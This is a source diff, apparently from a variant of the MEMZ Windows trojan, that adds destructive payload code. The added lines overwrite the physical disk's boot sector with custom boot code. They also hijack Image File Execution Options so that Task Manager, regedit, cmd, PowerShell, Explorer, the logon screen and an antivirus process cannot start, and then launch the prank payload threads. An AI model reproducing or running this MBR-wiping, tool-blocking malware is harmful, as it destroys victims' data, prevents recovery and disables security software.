@@ -82,25 +82,80 @@ STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 		ExitProcess(0);
 	}
 
-	HANDLE note = CreateFileA("note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+
+	if (drive == INVALID_HANDLE_VALUE)
+		ExitProcess(2);
+
+	unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);
+
+	// Join the two code parts together
+	int i = 0;
+	for (; i < code1_len; i++)
+		*(bootcode + i) = *(code1 + i);
+	for (i = 0; i < code2_len; i++)
+		*(bootcode + i + 0x1fe) = *(code2 + i);
+
 	DWORD wb;
+	if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
+		ExitProcess(3);
+
+	CloseHandle(drive);
+
+	HANDLE note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+
 	if (note == INVALID_HANDLE_VALUE)
 		ExitProcess(4);
 
-	if (!WriteFile(note, (LPCWSTR)msg, msg_len, &wb, NULL))
+	if (!WriteFile(note, msg, msg_len, &wb, NULL))
 		ExitProcess(5);
 
 	CloseHandle(note);
-	ShellExecuteA(NULL, NULL, "notepad", "note.txt", NULL, SW_SHOWDEFAULT);
+			ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
 
-	for (int p = 0; p < nPayloads; p++) {
-		Sleep(payloads[p].delay);
-		CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
-	}
+			LPWSTR system32 = (LPWSTR)LocalAlloc(0, 4096);
+			GetSystemDirectoryW(system32, 2048);
 
-	for (;;) {
-		Sleep(10000);
-	}
+			HKEY key;
+			RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", &key);
+
+			LPWSTR value = L"BigBalls.exe";
+
+			const LPWSTR killNames[] = {
+				L"logonui.exe",
+				L"taskmgr.exe",
+				L"msconfig.exe",
+				L"explorer.exe",
+				L"shutdown.exe",
+				L"taskkill.exe",
+				L"mmc.exe"
+				L"avp.exe",
+				L"CMD.exe",
+				L"regedit.exe",
+				L"powershell.exe",
+			};
+
+			for (int i = 0; i < sizeof(killNames) / sizeof(void*); i++) {
+				HKEY sKey;
+				RegCreateKeyW(key, killNames[i], &sKey);
+
+				RegSetValueExW(sKey, L"Debugger", 0, REG_SZ, (BYTE *)value, lstrlenW(value) * 2);
+
+				RegCloseKey(sKey);
+			}
+
+			RegCloseKey(key);
+
+			waveOutSetVolume(NULL, 0xffff);
+
+			for (int p = 0; p < nPayloads; p++) {
+				Sleep(payloads[p].delay);
+				CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
+			}
+
+			for (;;) {
+				Sleep(10000);
+			}
 
 #else // CLEAN
 	InitCommonControls();
@@ -358,5 +413,3 @@ BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam) {
 	return TRUE;
 }
 #endif
-
-
